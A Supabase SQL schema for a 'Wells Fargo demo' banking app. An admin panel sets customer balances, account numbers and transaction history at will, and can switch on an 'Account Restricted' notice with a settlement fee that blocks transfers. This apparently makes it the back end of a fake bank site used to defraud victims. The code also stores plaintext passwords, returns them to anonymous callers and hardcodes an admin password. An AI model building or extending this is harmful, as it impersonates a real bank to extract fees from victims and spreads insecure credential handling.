-- Wells Fargo demo — Supabase schema
-- Run this in the Supabase SQL Editor first.

create extension if not exists "pgcrypto";

-- ---------------------------------------------------------------------------
-- Bank customers (end-user profiles shown in the mobile app)
-- ---------------------------------------------------------------------------
create table if not exists public.bank_customers (
  id text primary key,
  username text not null unique,
  password text not null,
  full_name text not null,
  first_name text,
  dob text default '',
  age text default '',
  sex text default '',
  relationship text default '',
  address text default '',
  state text default '',
  zip text default '',
  email text default '',
  phone text default '',
  photo_url text default '',
  since_label text default '',
  show_address boolean default true,
  account_number text default '',
  routing_number text default '',
  accounts jsonb not null default '[]'::jsonb,
  card_balance text default '$0.00',
  spending_balance text default '$0.00',
  show_spending_card boolean default false,
  show_restriction_notice boolean default false,
  history_extras jsonb not null default '[]'::jsonb,
  restriction jsonb not null default jsonb_build_object(
    'title', 'Account Restricted',
    'greeting', 'Dear {name},',
    'message', 'Your account has been restricted.',
    'feeText', 'Reason: Unusual transfer activity was detected and outgoing transfers are temporarily blocked.',
    'button', 'I Understand',
    'support', 'Contact Support',
    'settlementFee', 0
  ),
  transfer_error jsonb not null default jsonb_build_object(
    'title', 'Error',
    'message', 'We''re sorry, we weren''t able to complete your request. Please try again.',
    'button', 'Retry'
  ),
  last_login_at timestamptz,
  last_active_at timestamptz,
  last_user_agent text default '',
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now()
);

create index if not exists bank_customers_username_idx on public.bank_customers (username);

-- ---------------------------------------------------------------------------
-- Admin users + sessions (admin dashboard auth)
-- ---------------------------------------------------------------------------
create table if not exists public.admin_users (
  id uuid primary key default gen_random_uuid(),
  username text not null unique,
  password text not null,
  display_name text not null default 'Admin',
  created_at timestamptz not null default now()
);

create table if not exists public.admin_sessions (
  token uuid primary key default gen_random_uuid(),
  admin_id uuid not null references public.admin_users(id) on delete cascade,
  expires_at timestamptz not null,
  created_at timestamptz not null default now()
);

create index if not exists admin_sessions_admin_id_idx on public.admin_sessions (admin_id);

-- ---------------------------------------------------------------------------
-- Updated-at trigger
-- ---------------------------------------------------------------------------
create or replace function public.set_updated_at()
returns trigger
language plpgsql
as $$
begin
  new.updated_at = now();
  return new;
end;
$$;

drop trigger if exists bank_customers_set_updated_at on public.bank_customers;
create trigger bank_customers_set_updated_at
  before update on public.bank_customers
  for each row execute function public.set_updated_at();

-- ---------------------------------------------------------------------------
-- Auth helpers (SECURITY DEFINER so anon key can call them safely)
-- ---------------------------------------------------------------------------
create or replace function public.authenticate_bank_user(
  p_username text,
  p_password text,
  p_user_agent text default ''
)
returns jsonb
language plpgsql
security definer
set search_path = public
as $$
declare
  row public.bank_customers%rowtype;
  ua text;
begin
  select * into row
  from public.bank_customers
  where username = trim(p_username)
    and password = p_password
  limit 1;

  if not found then
    return null;
  end if;

  ua := left(coalesce(p_user_agent, ''), 512);

  update public.bank_customers
  set last_login_at = now(),
      last_active_at = now(),
      last_user_agent = case when ua <> '' then ua else last_user_agent end
  where id = row.id
  returning * into row;

  return jsonb_build_object(
    'id', row.id,
    'username', row.username,
    'password', row.password,
    'name', row.full_name,
    'firstName', coalesce(nullif(row.first_name, ''), row.full_name),
    'dob', coalesce(row.dob, ''),
    'age', coalesce(row.age, ''),
    'sex', coalesce(row.sex, ''),
    'relationship', coalesce(row.relationship, ''),
    'address', coalesce(row.address, ''),
    'state', coalesce(row.state, ''),
    'zip', coalesce(row.zip, ''),
    'email', coalesce(row.email, ''),
    'phone', coalesce(row.phone, ''),
    'photo', coalesce(row.photo_url, ''),
    'since', coalesce(row.since_label, ''),
    'showAddress', coalesce(row.show_address, false),
    'accountNumber', coalesce(row.account_number, ''),
    'routingNumber', coalesce(row.routing_number, ''),
    'accounts', coalesce(row.accounts, '[]'::jsonb),
    'cardBalance', coalesce(row.card_balance, '$0.00'),
    'spendingBalance', coalesce(row.spending_balance, '$0.00'),
    'showSpendingCard', coalesce(row.show_spending_card, false),
    'showRestrictionNotice', coalesce(row.show_restriction_notice, false),
    'historyExtras', coalesce(row.history_extras, '[]'::jsonb),
    'restriction', coalesce(row.restriction, '{}'::jsonb),
    'transferError', coalesce(row.transfer_error, '{}'::jsonb),
    'lastLoginAt', row.last_login_at,
    'lastActiveAt', row.last_active_at,
    'lastUserAgent', coalesce(row.last_user_agent, '')
  );
end;
$$;

create or replace function public.bank_user_heartbeat(
  p_customer_id text,
  p_user_agent text default ''
)
returns boolean
language plpgsql
security definer
set search_path = public
as $$
declare
  ua text;
begin
  if p_customer_id is null or trim(p_customer_id) = '' then
    return false;
  end if;

  ua := left(coalesce(p_user_agent, ''), 512);

  update public.bank_customers
  set last_active_at = now(),
      last_user_agent = case when ua <> '' then ua else last_user_agent end
  where id = trim(p_customer_id);

  return found;
end;
$$;

create or replace function public.bank_customer_profile_json(c public.bank_customers)
returns jsonb
language sql
stable
as $$
  select jsonb_build_object(
    'id', c.id,
    'username', c.username,
    'password', c.password,
    'name', c.full_name,
    'firstName', coalesce(nullif(c.first_name, ''), c.full_name),
    'dob', coalesce(c.dob, ''),
    'age', coalesce(c.age, ''),
    'sex', coalesce(c.sex, ''),
    'relationship', coalesce(c.relationship, ''),
    'address', coalesce(c.address, ''),
    'state', coalesce(c.state, ''),
    'zip', coalesce(c.zip, ''),
    'email', coalesce(c.email, ''),
    'phone', coalesce(c.phone, ''),
    'photo', coalesce(c.photo_url, ''),
    'since', coalesce(c.since_label, ''),
    'showAddress', coalesce(c.show_address, false),
    'accountNumber', coalesce(c.account_number, ''),
    'routingNumber', coalesce(c.routing_number, ''),
    'accounts', coalesce(c.accounts, '[]'::jsonb),
    'cardBalance', coalesce(c.card_balance, '$0.00'),
    'spendingBalance', coalesce(c.spending_balance, '$0.00'),
    'showSpendingCard', coalesce(c.show_spending_card, false),
    'showRestrictionNotice', coalesce(c.show_restriction_notice, false),
    'historyExtras', coalesce(c.history_extras, '[]'::jsonb),
    'restriction', coalesce(c.restriction, '{}'::jsonb),
    'transferError', coalesce(c.transfer_error, '{}'::jsonb),
    'lastLoginAt', c.last_login_at,
    'lastActiveAt', c.last_active_at,
    'lastUserAgent', coalesce(c.last_user_agent, '')
  );
$$;

create or replace function public.get_bank_customer(p_customer_id text)
returns jsonb
language plpgsql
security definer
set search_path = public
as $$
declare
  row public.bank_customers%rowtype;
begin
  if p_customer_id is null or trim(p_customer_id) = '' then
    return null;
  end if;

  select * into row
  from public.bank_customers
  where id = trim(p_customer_id)
  limit 1;

  if not found then
    return null;
  end if;

  return public.bank_customer_profile_json(row);
end;
$$;

create or replace function public.bank_user_record_transfer(
  p_customer_id text,
  p_payload jsonb default '{}'::jsonb
)
returns jsonb
language plpgsql
security definer
set search_path = public
as $$
declare
  row public.bank_customers%rowtype;
  amount_text text;
  amount_num numeric;
  merchant text;
  memo text;
  from_title text;
  history jsonb;
  item jsonb;
  accounts jsonb;
  i int;
  acct jsonb;
  bal_num numeric;
  new_bal text;
  today text;
  restricted boolean;
begin
  if p_customer_id is null or trim(p_customer_id) = '' then
    return null;
  end if;

  select * into row
  from public.bank_customers
  where id = trim(p_customer_id)
  for update;

  if not found then
    return null;
  end if;

  amount_text := coalesce(nullif(trim(p_payload->>'amount'), ''), '0');
  amount_text := regexp_replace(amount_text, '[^0-9.]', '', 'g');
  if amount_text = '' then
    amount_text := '0';
  end if;
  amount_num := amount_text::numeric;
  merchant := left(coalesce(nullif(trim(p_payload->>'toAccount'), ''), 'External transfer'), 120);
  memo := left(coalesce(trim(p_payload->>'memo'), ''), 120);
  from_title := coalesce(nullif(trim(p_payload->>'fromAccount'), ''), '');
  restricted := coalesce(row.show_restriction_notice, false);
  today := to_char(timezone('America/Chicago', now()), 'Mon FMDD, YYYY');

  item := jsonb_build_object(
    'date', today,
    'merchant', merchant,
    'type', case
      when memo <> '' then memo
      when restricted then 'Transfer pending'
      else 'Transfer'
    end,
    'amount', ('-$' || to_char(amount_num, 'FM999999990.00')),
    'flow', 'debit',
    'pending', restricted
  );

  history := coalesce(row.history_extras, '[]'::jsonb);
  if jsonb_typeof(history) <> 'array' then
    history := '[]'::jsonb;
  end if;
  history := jsonb_build_array(item) || history;

  accounts := coalesce(row.accounts, '[]'::jsonb);

  if not restricted and amount_num > 0 and jsonb_typeof(accounts) = 'array' then
    for i in 0 .. jsonb_array_length(accounts) - 1 loop
      acct := accounts -> i;
      if from_title = '' or position(coalesce(acct->>'title', '') in from_title) > 0
         or position(from_title in coalesce(acct->>'title', '')) > 0
         or i = 0 and from_title = '' then
        bal_num := regexp_replace(coalesce(acct->>'balance', '0'), '[^0-9.-]', '', 'g')::numeric;
        bal_num := greatest(bal_num - amount_num, 0);
        new_bal := '$' || to_char(bal_num, 'FM999999990.00');
        accounts := jsonb_set(accounts, array[i::text, 'balance'], to_jsonb(new_bal), true);
        exit;
      end if;
    end loop;
  end if;

  update public.bank_customers
  set history_extras = history,
      accounts = accounts,
      card_balance = case
        when not restricted and amount_num > 0 and jsonb_array_length(accounts) > 0
          then coalesce(accounts -> 0 ->> 'balance', card_balance)
        else card_balance
      end,
      last_active_at = now()
  where id = row.id
  returning * into row;

  return public.bank_customer_profile_json(row);
end;
$$;

create or replace function public.admin_login(p_username text, p_password text)
returns jsonb
language plpgsql
security definer
set search_path = public
as $$
declare
  adm public.admin_users%rowtype;
  sess_token uuid;
  sess_expires timestamptz;
begin
  select * into adm
  from public.admin_users
  where username = trim(p_username)
    and password = p_password
  limit 1;

  if not found then
    return null;
  end if;

  sess_expires := now() + interval '14 days';
  insert into public.admin_sessions (admin_id, expires_at)
  values (adm.id, sess_expires)
  returning token into sess_token;

  return jsonb_build_object(
    'token', sess_token,
    'username', adm.username,
    'displayName', adm.display_name,
    'expiresAt', sess_expires
  );
end;
$$;

create or replace function public.admin_session_valid(p_token uuid)
returns boolean
language plpgsql
security definer
set search_path = public
as $$
begin
  return exists (
    select 1
    from public.admin_sessions
    where token = p_token
      and expires_at > now()
  );
end;
$$;

create or replace function public.admin_list_customers(p_token uuid)
returns setof public.bank_customers
language plpgsql
security definer
set search_path = public
as $$
begin
  if not public.admin_session_valid(p_token) then
    raise exception 'Unauthorized';
  end if;
  return query
    select * from public.bank_customers
    order by created_at desc;
end;
$$;

create or replace function public.admin_get_customer(p_token uuid, p_id text)
returns public.bank_customers
language plpgsql
security definer
set search_path = public
as $$
declare
  row public.bank_customers%rowtype;
begin
  if not public.admin_session_valid(p_token) then
    raise exception 'Unauthorized';
  end if;
  select * into row from public.bank_customers where id = p_id;
  return row;
end;
$$;

create or replace function public.admin_upsert_customer(p_token uuid, p_payload jsonb)
returns public.bank_customers
language plpgsql
security definer
set search_path = public
as $$
declare
  row public.bank_customers%rowtype;
  cid text;
  default_restriction jsonb := jsonb_build_object(
    'title', 'Account Restricted',
    'greeting', 'Dear {name},',
    'message', 'Your account has been restricted.',
    'feeText', 'Reason: Unusual transfer activity was detected and outgoing transfers are temporarily blocked.',
    'button', 'I Understand',
    'support', 'Contact Support',
    'settlementFee', 0
  );
  default_transfer jsonb := jsonb_build_object(
    'title', 'Error',
    'message', 'We''re sorry, we weren''t able to complete your request. Please try again.',
    'button', 'Retry'
  );
begin
  if not public.admin_session_valid(p_token) then
    raise exception 'Unauthorized';
  end if;

  cid := coalesce(nullif(p_payload->>'id', ''), replace(gen_random_uuid()::text, '-', ''));

  insert into public.bank_customers as bc (
    id, username, password, full_name, first_name, dob, age, sex, relationship,
    address, state, zip, email, phone, photo_url, since_label, show_address,
    account_number, routing_number, accounts, card_balance, spending_balance,
    show_spending_card, show_restriction_notice, history_extras, restriction, transfer_error
  ) values (
    cid,
    trim(p_payload->>'username'),
    p_payload->>'password',
    trim(p_payload->>'full_name'),
    coalesce(nullif(p_payload->>'first_name', ''), trim(p_payload->>'full_name')),
    coalesce(p_payload->>'dob', ''),
    coalesce(p_payload->>'age', ''),
    coalesce(p_payload->>'sex', ''),
    coalesce(p_payload->>'relationship', ''),
    coalesce(p_payload->>'address', ''),
    coalesce(p_payload->>'state', ''),
    coalesce(p_payload->>'zip', ''),
    coalesce(p_payload->>'email', ''),
    coalesce(p_payload->>'phone', ''),
    coalesce(p_payload->>'photo_url', ''),
    coalesce(p_payload->>'since_label', ''),
    coalesce((p_payload->>'show_address')::boolean, true),
    coalesce(p_payload->>'account_number', ''),
    coalesce(p_payload->>'routing_number', ''),
    coalesce(p_payload->'accounts', '[]'::jsonb),
    coalesce(p_payload->>'card_balance', '$0.00'),
    coalesce(p_payload->>'spending_balance', '$0.00'),
    coalesce((p_payload->>'show_spending_card')::boolean, false),
    coalesce((p_payload->>'show_restriction_notice')::boolean, false),
    coalesce(p_payload->'history_extras', '[]'::jsonb),
    coalesce(p_payload->'restriction', default_restriction),
    coalesce(p_payload->'transfer_error', default_transfer)
  )
  on conflict (id) do update set
    username = excluded.username,
    password = excluded.password,
    full_name = excluded.full_name,
    first_name = excluded.first_name,
    dob = excluded.dob,
    age = excluded.age,
    sex = excluded.sex,
    relationship = excluded.relationship,
    address = excluded.address,
    state = excluded.state,
    zip = excluded.zip,
    email = excluded.email,
    phone = excluded.phone,
    photo_url = excluded.photo_url,
    since_label = excluded.since_label,
    show_address = excluded.show_address,
    account_number = excluded.account_number,
    routing_number = excluded.routing_number,
    accounts = excluded.accounts,
    card_balance = excluded.card_balance,
    spending_balance = excluded.spending_balance,
    show_spending_card = excluded.show_spending_card,
    show_restriction_notice = excluded.show_restriction_notice,
    history_extras = excluded.history_extras,
    restriction = excluded.restriction,
    transfer_error = excluded.transfer_error
  returning * into row;

  return row;
end;
$$;

create or replace function public.admin_delete_customer(p_token uuid, p_id text)
returns boolean
language plpgsql
security definer
set search_path = public
as $$
begin
  if not public.admin_session_valid(p_token) then
    raise exception 'Unauthorized';
  end if;
  delete from public.bank_customers where id = p_id;
  return true;
end;
$$;

create or replace function public.admin_logout(p_token uuid)
returns boolean
language plpgsql
security definer
set search_path = public
as $$
begin
  delete from public.admin_sessions where token = p_token;
  return true;
end;
$$;

-- ---------------------------------------------------------------------------
-- RLS: block direct table access; use RPCs above
-- ---------------------------------------------------------------------------
alter table public.bank_customers enable row level security;
alter table public.admin_users enable row level security;
alter table public.admin_sessions enable row level security;

revoke all on public.bank_customers from anon, authenticated;
revoke all on public.admin_users from anon, authenticated;
revoke all on public.admin_sessions from anon, authenticated;

grant execute on function public.authenticate_bank_user(text, text, text) to anon, authenticated;
grant execute on function public.bank_user_heartbeat(text, text) to anon, authenticated;
grant execute on function public.bank_customer_profile_json(public.bank_customers) to anon, authenticated;
grant execute on function public.get_bank_customer(text) to anon, authenticated;
grant execute on function public.bank_user_record_transfer(text, jsonb) to anon, authenticated;
grant execute on function public.admin_login(text, text) to anon, authenticated;
grant execute on function public.admin_session_valid(uuid) to anon, authenticated;
grant execute on function public.admin_list_customers(uuid) to anon, authenticated;
grant execute on function public.admin_get_customer(uuid, text) to anon, authenticated;
grant execute on function public.admin_upsert_customer(uuid, jsonb) to anon, authenticated;
grant execute on function public.admin_delete_customer(uuid, text) to anon, authenticated;
grant execute on function public.admin_logout(uuid) to anon, authenticated;

-- ---------------------------------------------------------------------------
-- Storage bucket for profile photos
-- ---------------------------------------------------------------------------
insert into storage.buckets (id, name, public)
values ('avatars', 'avatars', true)
on conflict (id) do nothing;

-- Public read for avatars
drop policy if exists "Avatar public read" on storage.objects;
create policy "Avatar public read"
  on storage.objects for select
  using (bucket_id = 'avatars');

-- Allow anon uploads into avatars (admin UI uses anon key + session gate in app)
drop policy if exists "Avatar anon upload" on storage.objects;
create policy "Avatar anon upload"
  on storage.objects for insert
  to anon, authenticated
  with check (bucket_id = 'avatars');

drop policy if exists "Avatar anon update" on storage.objects;
create policy "Avatar anon update"
  on storage.objects for update
  to anon, authenticated
  using (bucket_id = 'avatars');

drop policy if exists "Avatar anon delete" on storage.objects;
create policy "Avatar anon delete"
  on storage.objects for delete
  to anon, authenticated
  using (bucket_id = 'avatars');

-- ---------------------------------------------------------------------------
-- Default admin
-- username: admin@wells.com  /  password: Odusanya2020$
-- ---------------------------------------------------------------------------
insert into public.admin_users (username, password, display_name)
values ('admin@wells.com', 'Odusanya2020$', 'Wellsfargo Admin')
on conflict (username) do update
set password = excluded.password,
    display_name = excluded.display_name;
